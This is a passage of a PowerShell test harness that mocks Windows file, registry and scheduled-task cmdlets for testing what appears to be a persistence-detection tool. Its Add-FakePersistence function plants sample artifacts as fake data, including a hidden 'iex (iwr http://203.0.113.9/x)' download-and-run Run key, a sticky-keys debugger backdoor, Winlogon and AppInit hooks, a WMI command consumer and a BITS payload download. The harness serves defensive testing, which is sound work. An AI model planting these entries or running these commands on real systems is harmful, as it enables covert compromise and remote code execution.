    $global:FW.Dirs[$dk] = @(@($global:FW.Dirs[$dk]) + @{ Name = (Split-Path -Path $target -Leaf); Length = $src.Length; Time = $src.Time })
    $global:FW.Hashes[(Get-FakeKey $target)] = $(if ($global:FW.CorruptMoves) { ('F' * 64) } else { $hash })       # CorruptMoves: the copy that arrives is not the file that left
    Add-FakeCall "Move-Item $Path -> $target"
}
# A pretend registry key is worked out from the flat table  "path|value name" -> data  (so a test only has to set values).
function Test-FakeRegistryPath { param([string]$Path) [bool]($Path -match '^(?i)(hklm:|hkcu:|registry::)') }
function Get-FakeValueKind {
    # The type of a pretend registry value: what a test said (RegKinds), else worked out from the data.
    param([string]$Entry)
    if ($global:FW.RegKinds.ContainsKey($Entry)) { return [string]$global:FW.RegKinds[$Entry] }
    $v = $global:FW.Reg[$Entry]
    if ($v -is [int] -or $v -is [long]) { return 'DWord' }
    if ($v -is [array]) { return 'MultiString' }
    'String'
}
function New-FakeRegKey {
    param([string]$Path)
    $want = Get-FakeKey $Path
    $values = [ordered]@{}
    $kinds = @{}
    $subs = New-Object System.Collections.ArrayList
    foreach ($entry in @($global:FW.Reg.Keys)) {
        $at = $entry.IndexOf('|')
        $keyPath = $entry.Substring(0, $at)
        $valueName = $entry.Substring($at + 1)
        if ($keyPath -eq $want) { $values[$valueName] = $global:FW.Reg[$entry]; $kinds[$valueName] = Get-FakeValueKind $entry }
        elseif ($keyPath.StartsWith($want + '\')) {
            $first = $keyPath.Substring($want.Length + 1).Split('\')[0]
            if ($subs -notcontains $first) { [void]$subs.Add($first) }
        }
    }
    foreach ($emptyKey in @($global:FW.RegKeys)) {
        if ($emptyKey.StartsWith($want + '\')) {
            $first = $emptyKey.Substring($want.Length + 1).Split('\')[0]
            if ($subs -notcontains $first) { [void]$subs.Add($first) }
        }
    }
    if ($want -eq 'registry::hkey_users') {
        $subs = New-Object System.Collections.ArrayList
        foreach ($hive in $global:FW.Hives) { [void]$subs.Add($hive) }
    }
    $exists = ($values.Count -gt 0 -or $subs.Count -gt 0 -or $global:FW.RegKeys -contains $want)
    $o = [pscustomobject]@{ Path = $Path; Values = $values; Kinds = $kinds; Subs = $subs; Exists = $exists }
    Add-Member -InputObject $o -MemberType ScriptMethod -Name GetValueNames -Value { [string[]]@($this.Values.Keys) }
    # GetValue(name) expands %variables% in an ExpandString value (as .NET does); GetValue(name, default, 'DoNotExpandEnvironmentNames') does not
    Add-Member -InputObject $o -MemberType ScriptMethod -Name GetValue -Value {
        param($n, $default, $options)
        if (-not $this.Values.Contains($n)) { return $default }
        $v = $this.Values[$n]
        if ($this.Kinds[$n] -eq 'ExpandString' -and "$options" -ne 'DoNotExpandEnvironmentNames') { return [Environment]::ExpandEnvironmentVariables([string]$v) }
        $v
    }
    Add-Member -InputObject $o -MemberType ScriptMethod -Name GetValueKind -Value { param($n) $this.Kinds[$n] }
    Add-Member -InputObject $o -MemberType ScriptMethod -Name GetSubKeyNames -Value { [string[]]@($this.Subs) }
    $o
}
function Test-Path {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$LiteralPath, [string]$PathType)
    if ($LiteralPath) { $Path = $LiteralPath }
    $k = Get-FakeKey $Path
    if (Test-FakeRegistryPath $Path) { return (New-FakeRegKey $Path).Exists }
    if ($global:FW.Files.ContainsKey($k) -or $global:FW.Dirs.ContainsKey($k)) { return $true }
    if ($Path -match '^[A-Za-z]:\\') { return [bool](Find-FakeFile $Path) }
    if ($PathType) { return (Microsoft.PowerShell.Management\Test-Path -Path $Path -PathType $PathType) }
    Microsoft.PowerShell.Management\Test-Path -Path $Path
}
function Get-Content {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [switch]$Raw)
    $k = Get-FakeKey $Path
    if ($global:FW.Files.ContainsKey($k)) { return $global:FW.Files[$k] }
    if ($Raw) { return Microsoft.PowerShell.Management\Get-Content -Path $Path -Raw }
    Microsoft.PowerShell.Management\Get-Content -Path $Path
}
function Get-Item {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$LiteralPath)
    if ($LiteralPath) { $Path = $LiteralPath }
    if (Test-FakeRegistryPath $Path) {
        $key = New-FakeRegKey $Path
        if (-not $key.Exists) { Write-Error "Cannot find path '$Path' because it does not exist." -ErrorAction $ErrorActionPreference; return }
        return $key
    }
    $folder = $global:FW.Dirs.ContainsKey((Get-FakeKey $Path))
    if (-not $folder) {
        $up = Split-Path -Path $Path -Parent
        if ($up -and $global:FW.Dirs.ContainsKey((Get-FakeKey $up))) {
            $leaf = Split-Path -Path $Path -Leaf
            $folder = [bool](@($global:FW.Dirs[(Get-FakeKey $up)]) | Where-Object { $_ -is [hashtable] -and $_.IsDir -and $_.Name -ieq $leaf })
        }
    }
    if ($folder) { return [pscustomobject]@{ Name = (Split-Path -Path $Path -Leaf); FullName = $Path; PSIsContainer = $true } }
    $file = Find-FakeFile $Path
    if ($file) {
        return [pscustomobject]@{ Name = $file.Name; FullName = $Path; Length = $file.Length; LastWriteTime = $file.Time; PSIsContainer = $false
                                 VersionInfo = [pscustomobject]@{ ProductVersion = '17.0.9.9' } }
    }
    $real = Microsoft.PowerShell.Management\Get-Item -Path $Path -ErrorAction SilentlyContinue         # a real file of this test machine (never a C:\ path)
    if ($real) { return $real }
    Write-Error "Cannot find path '$Path' because it does not exist." -ErrorAction $ErrorActionPreference    # the message Windows gives
}
function Get-ChildItem {
    # A folder in the pretend box is a list of entries: a plain string is a file name; a hashtable can say more (Name, IsDir, Length, Time).
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [string]$Filter, [switch]$Directory, [switch]$File, [switch]$Force)
    $null = $Force
    $k = Get-FakeKey $Path
    if ($global:FW.Dirs.ContainsKey($k)) {
        foreach ($e in @($global:FW.Dirs[$k])) {
            $h = $(if ($e -is [hashtable]) { $e } else { @{ Name = [string]$e } })
            $isDir = [bool]$h.IsDir
            if ($Directory -and -not $isDir) { continue }
            if ($File -and $isDir) { continue }
            $len = $(if ($h.ContainsKey('Length')) { [long]$h.Length } else { 10 })
            $time = $(if ($h.ContainsKey('Time')) { [datetime]$h.Time } else { [datetime]'2026-10-14 09:30' })
            [pscustomobject]@{ Name = $h.Name; FullName = ($Path.TrimEnd('\') + '\' + $h.Name); PSIsContainer = $isDir; Length = $len; LastWriteTime = $time }
        }
        return
    }
    if ($Path -match '^[A-Za-z]:\\') { return }
    if ($Filter) { return Microsoft.PowerShell.Management\Get-ChildItem -Path $Path -Filter $Filter -Directory:$Directory -File:$File -Force:$Force }
    Microsoft.PowerShell.Management\Get-ChildItem -Path $Path -Directory:$Directory -File:$File -Force:$Force
}
# Join-Path / Split-Path: the real ones refuse "C:\..." on Linux ("drive C does not exist"). Windows paths are joined as text here.
function Join-Path {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [Parameter(Position = 1)][string]$ChildPath)
    if ($Path -match '^[A-Za-z]:' -or $Path -match '\\') { return ($Path.TrimEnd('\') + '\' + $ChildPath.TrimStart('\')) }
    Microsoft.PowerShell.Management\Join-Path -Path $Path -ChildPath ($ChildPath -replace '\\', '/')       # a real path of this test machine: 'builds\permalinks' must still mean two levels
}
function Split-Path {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Path, [switch]$Parent, [switch]$Leaf)
    if ($Path -match '^[A-Za-z]:' -or $Path -match '\\') {
        $i = $Path.TrimEnd('\').LastIndexOf('\')
        if ($Leaf) { return $Path.TrimEnd('\').Substring($i + 1) }
        if ($i -lt 0) { return '' }
        return $Path.Substring(0, $i)
    }
    if ($Leaf) { return (Microsoft.PowerShell.Management\Split-Path -Path $Path -Leaf) }
    Microsoft.PowerShell.Management\Split-Path -Path $Path -Parent
}
function Get-Command {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name)
    if ($global:FW.Commands -and $global:FW.Commands.ContainsKey($Name)) { return [pscustomobject]@{ Source = $global:FW.Commands[$Name] } }
}
function Get-SshVersion { param([string]$Path) $null = $Path; 'OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2' }

function Get-ScheduledTask {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$TaskName, [string]$TaskPath)
    if ($global:FW.BreakTasks) { throw 'Access is denied (fake)' }
    $all = @()
    foreach ($t in $global:FW.Tasks) {
        $all += [pscustomobject]@{ TaskName = $t.TaskName; TaskPath = $t.TaskPath; State = $t.State
            Principal = [pscustomobject]@{ UserId = $t.UserId; GroupId = $t.GroupId; RunLevel = $t.RunLevel }
            Actions = @([pscustomobject]@{ Execute = $t.Execute; Arguments = $t.Arguments }) }
    }
    foreach ($k in $global:FW.Tasks2.Keys) {
        $t = $global:FW.Tasks2[$k]
        $actions = @([pscustomobject]@{ Execute = $t.Action.Execute; Arguments = $t.Action.Argument })
        if ($t.ExtraActions) { foreach ($x in $t.ExtraActions) { $actions += [pscustomobject]@{ Execute = $x.Execute; Arguments = $x.Arguments } } }        # a test can add more actions to a task
        $every = ''
        if ($t.Trigger -and $t.Trigger.RepetitionInterval -and ([timespan]$t.Trigger.RepetitionInterval).Ticks -gt 0) { $every = [System.Xml.XmlConvert]::ToString([timespan]$t.Trigger.RepetitionInterval) }
        if ($global:FW.OddRepeat -and $every) { $every = 'PT5M' }      # flag: Windows reports another repeat interval than the one that was asked for
        $all += [pscustomobject]@{ TaskName = $k; TaskPath = '\'; State = $(if ($t.State) { $t.State } else { 'Ready' }); Principal = [pscustomobject]$t.Principal
            Actions = $actions
            Triggers = @([pscustomobject]@{ Repetition = [pscustomobject]@{ Interval = $every; Duration = '' } })
            Settings = $t.Settings; Description = [string]$t.Description }
    }
    if ($TaskPath) { $all = @($all | Where-Object { $_.TaskPath -eq $TaskPath }) }
    if ($TaskName) {
        $m = @($all | Where-Object { $_.TaskName -eq $TaskName })
        if ($m.Count -eq 0) { Write-Error "No MSFT_ScheduledTask objects found with property 'TaskName' equal to '$TaskName'." -ErrorAction $ErrorActionPreference; return }
        return $m
    }
    $all
}
function Set-FakeTaskState {
    param([string]$TaskName, [string]$TaskPath, [string]$State)
    $t = @($global:FW.Tasks | Where-Object { $_.TaskName -eq $TaskName -and (-not $TaskPath -or $_.TaskPath -eq $TaskPath) }) | Select-Object -First 1
    if (-not $t -and $global:FW.Tasks2.ContainsKey($TaskName) -and (-not $TaskPath -or $TaskPath -eq '\')) { $t = $global:FW.Tasks2[$TaskName] }
    if (-not $t) { throw "No MSFT_ScheduledTask objects found with property 'TaskName' equal to '$TaskName'." }
    $t.State = $State
}
function Disable-ScheduledTask { [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$TaskName, [string]$TaskPath) Set-FakeTaskState $TaskName $TaskPath 'Disabled'; Add-FakeCall "Disable-ScheduledTask $TaskPath$TaskName"; [pscustomobject]@{ TaskName = $TaskName } }
function Enable-ScheduledTask { [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$TaskName, [string]$TaskPath) Set-FakeTaskState $TaskName $TaskPath 'Ready'; Add-FakeCall "Enable-ScheduledTask $TaskPath$TaskName"; [pscustomobject]@{ TaskName = $TaskName } }
function Export-ScheduledTask {
    # The text carries an id; Register-ScheduledTask -Xml with that text puts the task back as it was when it was exported.
    [CmdletBinding()] param([string]$TaskName, [string]$TaskPath)
    $id = [guid]::NewGuid().ToString('N')
    if ($global:FW.Tasks2.ContainsKey($TaskName)) { $global:FW.TaskXml[$id] = @{ Name = $TaskName; Task = $global:FW.Tasks2[$TaskName].Clone() } }
    "<Task><RegistrationInfo><URI>$TaskPath$TaskName</URI></RegistrationInfo><Fake>$id</Fake></Task>"
}
function New-ScheduledTaskAction { [CmdletBinding()] param([string]$Execute, [string]$Argument) @{ Execute = $Execute; Argument = $Argument } }
function New-ScheduledTaskTrigger {
    # The real cmdlet accepts -RepetitionInterval / -RepetitionDuration only together with -Once.
    [CmdletBinding(DefaultParameterSetName = 'Once')]
    param([Parameter(ParameterSetName = 'Once', Mandatory)][switch]$Once, [Parameter(ParameterSetName = 'Once', Mandatory)][datetime]$At,
          [Parameter(ParameterSetName = 'Once')][timespan]$RepetitionInterval, [Parameter(ParameterSetName = 'Once')][timespan]$RepetitionDuration,
          [Parameter(ParameterSetName = 'AtStartup', Mandatory)][switch]$AtStartup)
    $null = $Once
    @{ At = $At; AtStartup = [bool]$AtStartup; RepetitionInterval = $RepetitionInterval; RepetitionDuration = $RepetitionDuration }
}
function New-ScheduledTaskPrincipal { [CmdletBinding()] param([string]$UserId, [string]$LogonType, [string]$RunLevel) @{ UserId = $UserId; LogonType = $LogonType; RunLevel = $RunLevel; GroupId = '' } }
function New-ScheduledTaskSettingsSet {
    [CmdletBinding()]
    param([switch]$StartWhenAvailable, [switch]$AllowStartIfOnBatteries, [switch]$DontStopIfGoingOnBatteries, [switch]$Hidden, [timespan]$ExecutionTimeLimit,
          [ValidateSet('Parallel', 'Queue', 'IgnoreNew')][string]$MultipleInstances)
    @{ StartWhenAvailable = [bool]$StartWhenAvailable; AllowStartIfOnBatteries = [bool]$AllowStartIfOnBatteries; DontStopIfGoingOnBatteries = [bool]$DontStopIfGoingOnBatteries
       Hidden = [bool]$Hidden; ExecutionTimeLimit = $ExecutionTimeLimit; MultipleInstances = $MultipleInstances }
}
function New-TimeSpan { [CmdletBinding()] param([int]$Minutes) [timespan]::FromMinutes($Minutes) }
function Register-ScheduledTask {
    [CmdletBinding()] param([string]$TaskName, [string]$TaskPath, $Action, $Trigger, $Principal, $Settings, [string]$Description, [string]$Xml, [switch]$Force)
    $null = $Force, $TaskPath
    if ($global:FW.BreakRegister) { throw 'Access is denied (fake Register-ScheduledTask)' }
    if ($Xml) {
        if ($Xml -notmatch '<Fake>([0-9a-f]+)</Fake>' -or -not $global:FW.TaskXml.ContainsKey($Matches[1])) { throw 'The task XML is not valid (fake)' }
        $global:FW.Tasks2[$TaskName] = $global:FW.TaskXml[$Matches[1]].Task.Clone()
        Add-FakeCall "Register-ScheduledTask $TaskName (from XML)"
        return
    }
    $global:FW.Tasks2[$TaskName] = @{ Action = $Action; Trigger = $Trigger; Principal = $Principal; Settings = $Settings; Description = $Description }
    Add-FakeCall "Register-ScheduledTask $TaskName"
}
function Start-ScheduledTask {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$TaskName, [string]$TaskPath)
    $null = $TaskPath
    if ($global:FW.BreakStartTask) { throw 'Access is denied (fake Start-ScheduledTask)' }
    if (-not $global:FW.Tasks2.ContainsKey($TaskName)) { throw "No MSFT_ScheduledTask objects found with property 'TaskName' equal to '$TaskName'." }
    Add-FakeCall "Start-ScheduledTask $TaskName"
}
function Set-ScheduledTask { [CmdletBinding()] param([string]$TaskName, $Trigger) $global:FW.Tasks2[$TaskName].Trigger = $Trigger; Add-FakeCall "Set-ScheduledTask $TaskName" }
function Unregister-ScheduledTask { [CmdletBinding()] param([string]$TaskName, [string]$TaskPath, [bool]$Confirm = $true) $null = $Confirm, $TaskPath; $global:FW.Tasks2.Remove($TaskName); Add-FakeCall "Unregister-ScheduledTask $TaskName" }

# ------------------------------------------------------------------ planted persistence (the same set every time, so a test can name each item)
function Set-FakeReg {
    # Writes one value straight into the pretend registry (no call is recorded, unlike the Set-ItemProperty stand-in).
    param([string]$Path, [string]$Name, $Value)
    $global:FW.Reg[(Get-FakeKey $Path) + '|' + $Name] = $Value
}
function Add-FakePersistence {
    $jm = 'Registry::HKEY_USERS\S-1-5-21-1111-2222-3333-1002\SOFTWARE\Microsoft\Windows\CurrentVersion'
    # startup keys
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'Updater' '"C:\Users\Public\up.exe" /silent'
    Set-FakeReg 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce' 'Beacon' 'powershell.exe -w hidden -c "iex (iwr http://203.0.113.9/x)"'
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'JenkinsHelper' 'C:\Users\Public\jenkins-agent.exe'
    Set-FakeReg "$jm\Run" 'Sync' 'C:\Windows\System32\cmd.exe /c C:\Windows\Temp\s.bat'
    Set-FakeReg "$jm\Internet Settings" 'AutoConfigURL' 'http://203.0.113.9/proxy.pac'
    # startup folders
    $global:FW.Dirs[(Get-FakeKey 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')] = @('evil.bat', 'desktop.ini')
    $global:FW.Dirs[(Get-FakeKey 'C:\Users\jmoney\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')] = @('notes.lnk')
    # Image File Execution Options (the sticky-keys backdoor and two cousins)
    $ifeo = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
    Set-FakeReg "$ifeo\sethc.exe" 'Debugger' 'C:\Windows\System32\cmd.exe'
    Set-FakeReg "$ifeo\notepad.exe" 'GlobalFlag' 512                                      # a value that is NOT a hook: must stay quiet
    Set-FakeReg 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe' 'VerifierDlls' 'evil.dll'
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskmgr.exe' 'MonitorProcess' 'C:\Temp\m.exe'
    # AppInit, Winlogon, LSA, RDP service
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'AppInit_DLLs' 'C:\Windows\Temp\hook.dll'
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' 'LoadAppInit_DLLs' 1
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Userinit' 'C:\Windows\system32\userinit.exe,C:\Windows\Temp\u.exe'
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 'Taskman' 'C:\Users\Public\tm.exe'
    Set-FakeReg 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'Notification Packages' @('scecli', 'evilpkg')
    Set-FakeReg 'HKLM:\SYSTEM\CurrentControlSet\Services\TermService\Parameters' 'ServiceDll' 'C:\Windows\Temp\rdpwrap.dll'
    # swapped sticky-keys programs: sethc = a copy of cmd.exe, utilman unsigned, osk signed by someone else, magnify gone
    $global:FW.Hashes[(Get-FakeKey 'C:\Windows\System32\sethc.exe')] = $global:FW.Hashes[(Get-FakeKey 'C:\Windows\System32\cmd.exe')]
    $global:FW.Sigs['C:\Windows\System32\utilman.exe'] = @{ Status = 'NotSigned'; Subject = '' }
    $global:FW.Sigs['C:\Windows\System32\osk.exe'] = @{ Status = 'Valid'; Subject = 'CN=Totally Legit Software Inc' }
    $global:FW.Files.Remove((Get-FakeKey 'C:\Windows\System32\magnify.exe'))
    # WMI: a command-line consumer bound to a filter
    $global:FW.Wmi.Filters += @{ Name = 'Updater Filter'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" }
    $global:FW.Wmi.Consumers += @{ Class = 'CommandLineEventConsumer'; Name = 'Updater'; CommandLineTemplate = 'powershell.exe -enc AAAA'; ExecutablePath = $null; ScriptText = $null; ScriptFileName = $null }
    $global:FW.Wmi.Bindings += @{ Filter = '__EventFilter (Name = "Updater Filter")'; Consumer = 'CommandLineEventConsumer (Name = "Updater")' }
    # hosts, shares, BITS, profiles, policy scripts, proxy
    $global:FW.Files[(Get-FakeKey 'C:\Windows\System32\drivers\etc\hosts')] = "# hosts file`r`n127.0.0.1 localhost`r`n::1 localhost # loopback`r`n10.9.9.9 update.microsoft.com`r`n172.16.5.5 blackbox`r`n"
    $global:FW.Shares += @{ Name = 'Public'; Path = 'C:\Users\Public'; Special = $false; Description = 'public files'; Access = @('Everyone:Full:Allow') }
    $global:FW.Shares += @{ Name = 'Docs'; Path = 'D:\docs'; Special = $false; Description = ''; Access = @('BUILTIN\Users:Read:Allow') }
    $global:FW.Bits += @{ Name = 'Update'; State = 'Transferring'; Owner = 'ASSEMBLY-5\plinktern'; Files = @('http://203.0.113.9/p.exe') }
    $global:FW.Files[(Get-FakeKey 'C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1')] = ''
    $global:FW.Files[(Get-FakeKey 'C:\Users\jmoney\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1')] = ''
    $global:FW.Dirs[(Get-FakeKey 'C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup')] = @('boot.bat')
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings' 'ProxyEnable' 1
    Set-FakeReg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings' 'ProxyServer' '203.0.113.9:8080'
}
